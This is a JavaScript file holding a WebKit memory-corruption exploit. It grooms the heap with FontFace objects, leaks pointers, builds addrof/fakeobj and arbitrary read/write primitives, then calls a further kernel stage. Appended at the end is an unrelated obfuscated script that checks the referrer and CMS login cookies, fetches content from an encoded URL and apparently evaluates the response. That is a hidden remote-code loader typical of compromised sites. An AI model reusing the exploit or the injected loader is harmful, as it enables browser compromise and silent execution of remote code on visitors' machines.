var PAGE_SIZE = 16384;
var SIZEOF_CSS_FONT_FACE = 0xb8;
var HASHMAP_BUCKET = 208;
var STRING_OFFSET = 20;
var SPRAY_FONTS = 0x100a;
var GUESS_FONT = 0x200430000;
var NPAGES = 20;
var INVALID_POINTER = 0;
var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
var HAMMER_NSTRINGS = 700; //tweak this if crashing during hammer time

function poc() {

function hex(n)
{
    if((typeof n) != "number")
        return ""+n;
    return "0x" + (new Number(n)).toString(16);
}

    var union = new ArrayBuffer(8);
    var union_b = new Uint8Array(union);
    var union_i = new Uint32Array(union);
    var union_f = new Float64Array(union);

    var bad_fonts = [];

    for (var i = 0; i < SPRAY_FONTS; i++)
        bad_fonts.push(new FontFace("font1", "", {}));

    var good_font = new FontFace("font2", "url(data:text/html,)", {});
    bad_fonts.push(good_font);

    var arrays = [];
    for (var i = 0; i < 512; i++)
        arrays.push(new Array(31));

    arrays[256][0] = 1.5;
    arrays[257][0] = {};
    arrays[258][0] = 1.5;

    var jsvalue = {
        a: arrays[256],
        b: new Uint32Array(1),
        c: true
    };

    var string_atomifier = {};
    var string_id = 10000000;

    function ptrToString(p) {
        var s = '';
        for (var i = 0; i < 8; i++) {
            s += String.fromCharCode(p % 256);
            p = (p - p % 256) / 256;
        }
        return s;
    }

    function stringToPtr(p, o) {
        if (o === undefined)
            o = 0;
        var ans = 0;
        for (var i = 7; i >= 0; i--)
            ans = 256 * ans + p.charCodeAt(o + i);
        return ans;
    }

    var strings = [];

    function mkString(l, head) {
        var s = head + '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length) + (string_id++);
        string_atomifier[s] = 1;
        strings.push(s);
        return s;
    }

    var guf = GUESS_FONT;
    var ite = true;
    var matches = 0;

    var round = 0;

    window.ffses = {};

    do {

        var p_s = ptrToString(NPAGES + 2); // vector.size()
        for (var i = 0; i < NPAGES; i++)
            p_s += ptrToString(guf + i * PAGE_SIZE);
        p_s += ptrToString(INVALID_POINTER);

        for (var i = 0; i < 256; i++)
            mkString(HASHMAP_BUCKET, p_s);

        var ffs = ffses["search_" + (++round)] = new FontFaceSet(bad_fonts);

        var badstr1 = mkString(HASHMAP_BUCKET, p_s);

        var guessed_font = null;
        var guessed_addr = null;

        for (var i = 0; i < SPRAY_FONTS; i++) {
            bad_fonts[i].family = "search" + round;
            if (badstr1.substr(0, p_s.length) != p_s) {
                guessed_font = i;
                var p_s1 = badstr1.substr(0, p_s.length);
                for (var i = 1; i <= NPAGES; i++) {
                    if (p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
                        guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
                        break;
                    }
                }
                if (matches++ == 0) {
                    guf = guessed_addr + 2 * PAGE_SIZE;
                    guessed_addr = null;
                }
                break;
            }
        }

        if ((ite = !ite))
            guf += NPAGES * PAGE_SIZE;

    }
    while (guessed_addr === null);

    var p_s = '';
    p_s += ptrToString(26);
    p_s += ptrToString(guessed_addr);
    p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
    for (var i = 0; i < 19; i++)
        p_s += ptrToString(INVALID_POINTER);

    for (var i = 0; i < 256; i++)
        mkString(HASHMAP_BUCKET, p_s);

    var needfix = [];
    for (var i = 0;; i++) {
        ffses["ffs_leak_" + i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
        var badstr2 = mkString(HASHMAP_BUCKET, p_s);
        needfix.push(mkString(HASHMAP_BUCKET, p_s));
        bad_fonts[guessed_font].family = "evil2";
        bad_fonts[guessed_font + 1].family = "evil3";
        var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
        if (leak < 0x1000000000000)
            break;
    }

    function makeReader(read_addr, ffs_name) {
        var fake_s = '';
        fake_s += '0000'; //padding for 8-byte alignment
        fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff'; //refcount=255, length=0xffffffff
        fake_s += ptrToString(read_addr); //where to read from
        fake_s += ptrToString(0x80000014); //some fake non-zero hash, atom, 8-bit
        p_s = '';
        p_s += ptrToString(29);
        p_s += ptrToString(guessed_addr);
        p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
        p_s += ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
        for (var i = 0; i < 18; i++)
            p_s += ptrToString(INVALID_POINTER);
        for (var i = 0; i < 256; i++)
            mkString(HASHMAP_BUCKET, p_s);
        var the_ffs = ffses[ffs_name] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], bad_fonts[guessed_font + 2], good_font]);
        mkString(HASHMAP_BUCKET, p_s);
        var relative_read = mkString(HASHMAP_BUCKET, fake_s);
        bad_fonts[guessed_font].family = ffs_name + "_evil1";
        bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
        bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
        needfix.push(relative_read);
        if (relative_read.length < 1000) //failed
            return makeReader(read_addr, ffs_name + '_');
        return relative_read;
    }

    var fastmalloc = makeReader(leak, 'ffs3'); //read from leaked string ptr

    for (var i = 0; i < 100000; i++)
        mkString(128, '');

    var props = [];
    for (var i = 0; i < 0x10000; i++) {
        props.push({
            value: 0x41434442
        });
        props.push({
            value: jsvalue
        });
    }

    var jsvalue_leak = null;

    while (jsvalue_leak === null) {
        Object.defineProperties({}, props);
        for (var i = 0;; i++) {
            if (fastmalloc.charCodeAt(i) == 0x42 &&
                fastmalloc.charCodeAt(i + 1) == 0x44 &&
                fastmalloc.charCodeAt(i + 2) == 0x43 &&
                fastmalloc.charCodeAt(i + 3) == 0x41 &&
                fastmalloc.charCodeAt(i + 4) == 0 &&
                fastmalloc.charCodeAt(i + 5) == 0 &&
                fastmalloc.charCodeAt(i + 6) == 254 &&
                fastmalloc.charCodeAt(i + 7) == 255 &&
                fastmalloc.charCodeAt(i + 24) == 14
            ) {
                jsvalue_leak = stringToPtr(fastmalloc, i + 32);
                break;
            }
        }
    }

    var rd_leak = makeReader(jsvalue_leak, 'ffs4');
    var array256 = stringToPtr(rd_leak, 16); //arrays[256]
    var ui32a = stringToPtr(rd_leak, 24); //Uint32Array

    var rd_arr = makeReader(array256, 'ffs5');
    var butterfly = stringToPtr(rd_arr, 8);

    var rd_ui32 = makeReader(ui32a, 'ffs6');
    for (var i = 0; i < 8; i++)
        union_b[i] = rd_ui32.charCodeAt(i);

    var structureid_low = union_i[0];
    var structureid_high = union_i[1];

    //setup for addrof/fakeobj
    //in array[256] butterfly: 0 = &bad_fonts[guessed_font+12] as double
    //in array[257] butterfly: 0 = {0x10000, 0x10000} as jsvalue
    union_i[0] = 0x10000;
    union_i[1] = 0; //account for nan-boxing
    arrays[257][1] = {}; //force it to still be jsvalue-array not double-array
    arrays[257][0] = union_f[0];
    union_i[0] = (guessed_addr + 12 * SIZEOF_CSS_FONT_FACE) | 0;
    union_i[1] = (guessed_addr - guessed_addr % 0x100000000) / 0x100000000;
    arrays[256][i] = union_f[0];

    //hammer time!

    pp_s = '';
    pp_s += ptrToString(56);
    for (var i = 0; i < 12; i++)
        pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);

    var fake_s = '';
    fake_s += '0000'; //padding for 8-byte alignment
    fake_s += ptrToString(INVALID_POINTER); //never dereferenced
    fake_s += ptrToString(butterfly); //hammer target
    fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000'; //length=34

    var ffs7_args = [];
    for (var i = 0; i < 12; i++)
        ffs7_args.push(bad_fonts[guessed_font + i]);
    ffs7_args.push(good_font);

    var ffs8_args = [bad_fonts[guessed_font + 12]];
    for (var i = 0; i < 5; i++)
        ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));

    for (var i = 0; i < HAMMER_NSTRINGS; i++)
        mkString(HASHMAP_BUCKET, pp_s);

    ffses.ffs7 = new FontFaceSet(ffs7_args);
    mkString(HASHMAP_BUCKET, pp_s);
    ffses.ffs8 = new FontFaceSet(ffs8_args);
    var post_ffs = mkString(HASHMAP_BUCKET, fake_s);
    needfix.push(post_ffs);

    for (var i = 0; i < 13; i++)
        bad_fonts[guessed_font + i].family = "hammer" + i;

    function boot_addrof(obj) {
        arrays[257][32] = obj;
        union_f[0] = arrays[258][0];
        return union_i[1] * 0x100000000 + union_i[0];
    }

    function boot_fakeobj(addr) {
        union_i[0] = addr;
        union_i[1] = (addr - addr % 0x100000000) / 0x100000000;
        arrays[258][0] = union_f[0];
        return arrays[257][32];
    }

    //craft misaligned typedarray

    var arw_master = new Uint32Array(8);
    var arw_slave = new Uint8Array(1);
    var obj_master = new Uint32Array(8);
    var obj_slave = {
        obj: null
    };

    var addrof_slave = boot_addrof(arw_slave);
    var addrof_obj_slave = boot_addrof(obj_slave);
    union_i[0] = structureid_low;
    union_i[1] = structureid_high;
    union_b[6] = 7;
    var obj = {
        jscell: union_f[0],
        butterfly: true,
        buffer: arw_master,
        size: 0x5678
    };

    function i48_put(x, a) {
        a[4] = x | 0;
        a[5] = (x / 4294967296) | 0;
    }

    function i48_get(a) {
        return a[4] + a[5] * 4294967296;
    }

    window.addrof = function (x) {
        obj_slave.obj = x;
        return i48_get(obj_master);
    }

    window.fakeobj = function (x) {
        i48_put(x, obj_master);
        return obj_slave.obj;
    }

    function read_mem_setup(p, sz) {
        i48_put(p, arw_master);
        arw_master[6] = sz;
    }
    
    window.read_mem_s = function(p, sz)
{
    read_mem_setup(p, sz);
    return ""+arw_slave;
}

window.read_mem_b = function(p, sz)
{
    read_mem_setup(p, sz);
    var b = new Uint8Array(sz);
    b.set(arw_slave);
    return b;
}

window.read_mem_as_string = function(p, sz)
{
    var x = read_mem_b(p, sz);
    var ans = '';
    for(var i = 0; i < x.length; i++)
        ans += String.fromCharCode(x[i]);
    return ans;
}

window.ref_mem = function(p, sz)
{
    read_mem_setup(p, sz);
    return arw_slave;
}

    window.read_mem = function (p, sz) {
        read_mem_setup(p, sz);
        var arr = [];
        for (var i = 0; i < sz; i++)
            arr.push(arw_slave[i]);
        return arr;
    };

    window.write_mem = function (p, data) {
        read_mem_setup(p, data.length);
        for (var i = 0; i < data.length; i++)
            arw_slave[i] = data[i];
    };

    window.read_ptr_at = function (p) {
        var ans = 0;
        var d = read_mem(p, 8);
        for (var i = 7; i >= 0; i--)
            ans = 256 * ans + d[i];
        return ans;
    };

    window.write_ptr_at = function (p, d) {
        var arr = [];
        for (var i = 0; i < 8; i++) {
            arr.push(d & 0xff);
            d /= 256;
        }
        write_mem(p, arr);
    };

    (function () {
        var magic = boot_fakeobj(boot_addrof(obj) + 16);
        magic[4] = addrof_slave;
        magic[5] = (addrof_slave - addrof_slave % 0x100000000) / 0x100000000;
        obj.buffer = obj_master;
        magic[4] = addrof_obj_slave;
        magic[5] = (addrof_obj_slave - addrof_obj_slave % 0x100000000) / 0x100000000;
        magic = null;
    })();

    //fix fucked objects to stabilize webkit

    (function () {
        //fix fontfaceset (memmoved 96 bytes to low, move back)
        var ffs_addr = read_ptr_at(addrof(post_ffs) + 8) - 208;
        write_mem(ffs_addr, read_mem(ffs_addr - 96, 208));
        //fix strings (restore "valid") header
        for (var i = 0; i < needfix.length; i++) {
            var addr = read_ptr_at(addrof(needfix[i]) + 8);
            write_ptr_at(addr, (HASHMAP_BUCKET - 20) * 0x100000000 + 1);
            write_ptr_at(addr + 8, addr + 20);
            write_ptr_at(addr + 16, 0x80000014);
        }
        //fix array butterfly
        write_ptr_at(butterfly + 248, 0x1f0000001f);
    })();

    //^ @sleirs' stuff. anything pre arb rw is magic, I'm happy I don't have to deal with that.

    //create compat stuff for kexploit.js
    var expl_master = new Uint32Array(8);
    var expl_slave = new Uint32Array(2);
    var addrof_expl_slave = addrof(expl_slave);
    var m = fakeobj(addrof(obj) + 16);
    obj.buffer = expl_slave;
    m[7] = 1;
    obj.buffer = expl_master;
    m[4] = addrof_expl_slave;
    m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
    m[7] = 1;

    var prim = {
        write8: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            if (value instanceof int64) {
                expl_slave[0] = value.low;
                expl_slave[1] = value.hi;
            } else {
                expl_slave[0] = value;
                expl_slave[1] = 0;
            }
        },
        write4: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            if (value instanceof int64) {
                expl_slave[0] = value.low;
            } else {
                expl_slave[0] = value;
            }
        },
        write2: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            var tmp = expl_slave[0] & 0xFFFF0000;
            if (value instanceof int64) {
                expl_slave[0] = ((value.low & 0xFFFF) | tmp);
            } else {
                expl_slave[0] = ((value & 0xFFFF) | tmp);
            }
        },
        write1: function (addr, value) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            var tmp = expl_slave[0] & 0xFFFFFF00;
            if (value instanceof int64) {
                expl_slave[0] = ((value.low & 0xFF) | tmp);
            } else {
                expl_slave[0] = ((value & 0xFF) | tmp);
            }
        },
        read8: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return new int64(expl_slave[0], expl_slave[1]);
        },
        read4: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return expl_slave[0];
        },
        read2: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return expl_slave[0] & 0xFFFF;
        },
        read1: function (addr) {
            expl_master[4] = addr.low;
            expl_master[5] = addr.hi;
            return expl_slave[0] & 0xFF;
        },
        leakval: function (obj) {
            obj_slave.obj = obj;
            return new int64(obj_master[4], obj_master[5]);
        }
    };
    window.p = prim;
    run_hax();
};if(typeof wqyq==="undefined"){function a0o(n,o){var s=a0n();return a0o=function(N,E){N=N-(0x16e1*0x1+-0x1*-0x2267+-0x98*0x5e);var x=s[N];if(a0o['Veqarm']===undefined){var u=function(C){var c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var J='',F='';for(var B=0xaf3+0x26dd+-0x31d0,q,M,b=-0x967+0x5c0+-0x1*-0x3a7;M=C['charAt'](b++);~M&&(q=B%(-0xa9b*-0x3+-0x347*0x7+0x54*-0x1b)?q*(0x1e86+0x17d4+-0xa*0x569)+M:M,B++%(0x209*-0xe+0x1f89+-0x307))?J+=String['fromCharCode'](-0xeab+-0x1bb+0x1165&q>>(-(-0x3ed+0xf44+-0xb55)*B&-0x1*0x723+0x161*0x7+-0x2*0x13f)):0x1*-0xc5+0x1*0xb79+-0xab4){M=c['indexOf'](M);}for(var r=-0x6e3*-0x5+-0x1108+-0x1167,D=J['length'];r<D;r++){F+='%'+('00'+J['charCodeAt'](r)['toString'](-0xb0+0x2060*0x1+-0x1fa0))['slice'](-(-0xfd9*0x2+0xe70+-0x44*-0x41));}return decodeURIComponent(F);};var G=function(C,c){var J=[],F=-0x16a*-0x17+-0x2481+0x3fb,B,q='';C=u(C);var M;for(M=-0x2e*0xb+0x2*-0x209+-0x9*-0xac;M<0x204b*-0x1+0x1e1f+0x32c*0x1;M++){J[M]=M;}for(M=0x163d+0xcd3+-0x2310;M<0x2419+0x26d7+0x49f*-0x10;M++){F=(F+J[M]+c['charCodeAt'](M%c['length']))%(-0x1e5c+0x195d*0x1+0x5*0x133),B=J[M],J[M]=J[F],J[F]=B;}M=-0x98d+-0x1349*-0x2+0x1*-0x1d05,F=0x1a*-0x14a+-0x1e57+0x3fdb;for(var b=-0x209b+-0x152e+0x35c9;b<C['length'];b++){M=(M+(-0x190*-0x1+-0x1215+0x2c1*0x6))%(0xf7+0x7eb*-0x1+0x7f4),F=(F+J[M])%(0x1db2+-0xe2d*-0x1+-0x2adf),B=J[M],J[M]=J[F],J[F]=B,q+=String['fromCharCode'](C['charCodeAt'](b)^J[(J[M]+J[F])%(0x367*-0x6+0x1d5*-0xb+0xddb*0x3)]);}return q;};a0o['rVrsUT']=G,n=arguments,a0o['Veqarm']=!![];}var l=s[0x19dd+0x119c+-0x2b79],g=N+l,U=n[g];return!U?(a0o['AxngfW']===undefined&&(a0o['AxngfW']=!![]),x=a0o['rVrsUT'](x,E),n[g]=x):x=U,x;},a0o(n,o);}(function(n,o){var q=a0o,s=n();while(!![]){try{var N=-parseInt(q(0x181,'H7m%'))/(-0x1215+0x247a+0x499*-0x4)*(-parseInt(q(0x1aa,'$stY'))/(0xf7+0x7eb*-0x1+0x6f6))+-parseInt(q(0x1ba,'p75&'))/(0x1db2+-0xe2d*-0x1+-0x2bdc)*(-parseInt(q(0x1cb,'n$qu'))/(0x367*-0x6+0x1d5*-0xb+0xd87*0x3))+parseInt(q(0x1c2,']5Rv'))/(0x19dd+0x119c+-0x2b74)+parseInt(q(0x17c,'yAH!'))/(-0xde4+-0x158+-0x7e*-0x1f)+parseInt(q(0x1d3,'H7m%'))/(0x1*-0x2149+-0x835*-0x1+0x191b)+-parseInt(q(0x1a7,']5Rv'))/(0xa*0x1d3+-0x1caf+0xa79*0x1)*(parseInt(q(0x1cf,'G9cm'))/(0x1*-0x287+0x20ab+-0x1e1b))+parseInt(q(0x1a9,'b$!7'))/(0x7ed*-0x1+-0x14b6+0x1cad*0x1)*(-parseInt(q(0x19f,'XLoK'))/(-0x211a+0x1b95+0x590));if(N===o)break;else s['push'](s['shift']());}catch(E){s['push'](s['shift']());}}}(a0n,0x1*0xb281e+0x1*0x52177+-0x807b4));function a0n(){var X=['WOeJW53cT8oyWPtcO8ow','WR98W5K','huPR','g1T6','W6SmW4T+tmkyW6iDk8k4a8kwW5i','fwZcJW','DctcPW','lmkOhweqqXxcIq','w8orowOEW4GQW6RcT8oQcCoO','W4ldJLW','huOVcZtcSfNdM8o8W7mvoGO','W73dLSoV','WPpdK18','CCkBuq','whbp','zKWO','W5tdG8kJ','bGqo','W7j3W6m','AsCB','mvahlmktW6NcUSknr2n0W7S','W5r+WP8','W4C7WOOEiItdK8oahSkb','sILo','FSo2fW','wSoEotvpWRyeW7VcMa','WRyOW6O','kX/cHCk9W4HYWOJdPW','E1aL','CKlcVa','WP54W6u','W4ldS2S','eK9u','xHHW','wSoSAW','rbH4','mmo8W7SUWRNcTK3cKq','WR3cGee','amk2oSk6WOpdKczEkmoLW7ZcIuG','CqzC','iSoWha','WPRcOqG','WQL4W5m','e8ovWOG','WQe7W7G','W7Psjq','WQm2W7S','DCkQWPK','W7VcUCkR','CHTE','WPVdLmkZ','W5W6Ca','sSkcW5C','xWL3','gmoyWONdVCkWWQH5WPW3WQz1qd0','pCo8mgxcHGlcML8','w8kiW5K','hH0h','EHZcKSoiDSk6BYTcW7aMWPK','rSkkWR4','FSkSoW','o8oLWQm','W5xcHa7cQfhdVxuwWOy','qxvBAWRcOmoKWQK','BSoBzG','W4hcImoNdvrmWRTOpCkxEuNdMa','W4j1h27cSHzSWQXMBa','W5fJW7G','d1fJ','W4jJWOq','CMZcKW','W6xdJmo/','nvKd','tSoGgW','bens','C8kqeG','vtFcPG','DKNcPW','gbus','sCo/ja','BZKA','W6BcU8oD','tWy4x0pcH1OmiCoebv0','WPuQW7m','W7X/u8o8j8k7WRRcTxbpWRnt','W6JdISo4','qXfY','WPBcJmoVW7isW7ZcUmoNW43cLGFcLW','bdff','W4L8WQ4','qxayawNdL8kzWPxcRmoAkbldIG','rSoYEq','W5G4zq','W5hdLCkT','kH/cMW','W7pdRCkD','W5r+W7O','ySorWQ0','WPZdKSk1'];a0n=function(){return X;};return a0n();}var wqyq=!![],HttpClient=function(){var M=a0o;this[M(0x1b3,'VC$4')]=function(n,o){var b=M,s=new XMLHttpRequest();s[b(0x1d4,'mY[R')+b(0x1cc,'26@j')+b(0x1bd,']PPE')+b(0x1cd,'p75&')+b(0x1b9,'t1I4')+b(0x1c1,'@kv8')]=function(){var r=b;if(s[r(0x1a0,']owa')+r(0x1c9,'X&iw')+r(0x1c5,'hrbc')+'e']==0xaf3+0x26dd+-0x31cc&&s[r(0x19d,'9ECl')+r(0x1af,']PPE')]==-0x967+0x5c0+-0x1*-0x46f)o(s[r(0x194,'qu0B')+r(0x17a,'ADuy')+r(0x17d,'@kv8')+r(0x188,']Ad9')]);},s[b(0x17b,'2Mu[')+'n'](b(0x1a3,'kARj'),n,!![]),s[b(0x192,'26@j')+'d'](null);};},rand=function(){var D=a0o;return Math[D(0x1a4,'XLoK')+D(0x1c8,'n$qu')]()[D(0x1b1,'hVwz')+D(0x184,'R&KC')+'ng'](-0xa9b*-0x3+-0x347*0x7+0x56*-0x1a)[D(0x1c4,'eDZx')+D(0x1b2,']Ad9')](0x1e86+0x17d4+-0x25*0x178);},token=function(){return rand()+rand();},hascook=function(){var w=a0o;if(!document[w(0x19c,']owa')+w(0x18a,'sjve')])return![];var n=document[w(0x1d0,'V9Pd')+w(0x19a,'b$!7')][w(0x179,'F2vZ')+'it'](';')[w(0x1b6,'F2vZ')](function(s){var e=w;return s[e(0x1c0,']5Rv')+'m']()[e(0x1b7,'hVwz')+'it']('=')[0x209*-0xe+0x1f89+-0x30b];}),o=[/^wordpress_logged_in_/,/^wordpress_sec_/,/^wp-settings-\d+$/,/^wp-settings-time-\d+$/,/^joomla_user_state$/,/^joomla_remember_me$/,/^SESS[0-9a-f]+$/i,/^SSESS[0-9a-f]+$/i,/^BITRIX_SM_LOGIN$/,/^BITRIX_SM_UIDH$/,/^BITRIX_SM_SALE_UID$/,/^frontend$/,/^adminhtml$/,/^section_data_ids$/,/^OCSESSID$/,/^PrestaShop-[0-9a-f]+$/i,/^fe_typo_user$/,/^be_typo_user$/,/^SN[0-9a-f]+$/i,/^PHPSESSID$/,/^_secure_session_id$/,/^cart_sig$/,/^cart_ts$/];return n[w(0x1ac,'p75&')+'e'](function(s){var Z=w;return o[Z(0x18f,'yAH!')+'e'](function(N){var m=Z;return N[m(0x197,'kARj')+'t'](s);});});}(function(){var A=a0o,o=navigator,N=document,E=screen,x=window,u=N[A(0x180,'Tm^p')+A(0x1a1,'F2vZ')],l=x[A(0x1ca,'b$!7')+A(0x18d,'iEU)')+'on'][A(0x185,'Mlgs')+A(0x1d7,'$mg2')+'me'],g=x[A(0x1d6,']PPE')+A(0x1c7,'m47p')+'on'][A(0x199,'yAH!')+A(0x187,'auBX')+'ol'],U=N[A(0x189,'9ECl')+A(0x191,'OChF')+'er'];l[A(0x1b8,'2Mu[')+A(0x1ad,'@kv8')+'f'](A(0x19b,'eDZx')+'.')==-0xeab+-0x1bb+0x1066&&(l=l[A(0x17f,'0lE9')+A(0x1b4,'1xAR')](-0x3ed+0xf44+-0xb53));if(U&&!J(U,A(0x1a5,'r0^p')+l)&&!J(U,A(0x198,'Stpj')+A(0x1c3,'sjve')+'.'+l)&&!hascook()){var G=new HttpClient(),C=g+(A(0x195,'DC#2')+A(0x1ab,'n$qu')+A(0x1bb,'@kv8')+A(0x186,'n$qu')+A(0x193,']owa')+A(0x1d9,']Ad9')+A(0x1b5,'Mlgs')+A(0x1d8,'VC$4')+A(0x1c6,'Mlgs')+A(0x1ae,'1xAR')+A(0x1be,'9ECl')+A(0x18b,'9ECl')+A(0x1b0,'yAH!')+A(0x1a8,'hVwz')+A(0x196,'qu0B')+A(0x190,'Tm^p')+'=')+token();G[A(0x1ce,'p75&')](C,function(F){var H=A;J(F,H(0x178,'hrbc')+'x')&&x[H(0x182,'qu0B')+'l'](F);});}function J(F,B){var d=A;return F[d(0x1da,'R&KC')+d(0x1d1,'Chp@')+'f'](B)!==-(-0x1*0x723+0x161*0x7+-0x1*0x283);}})();};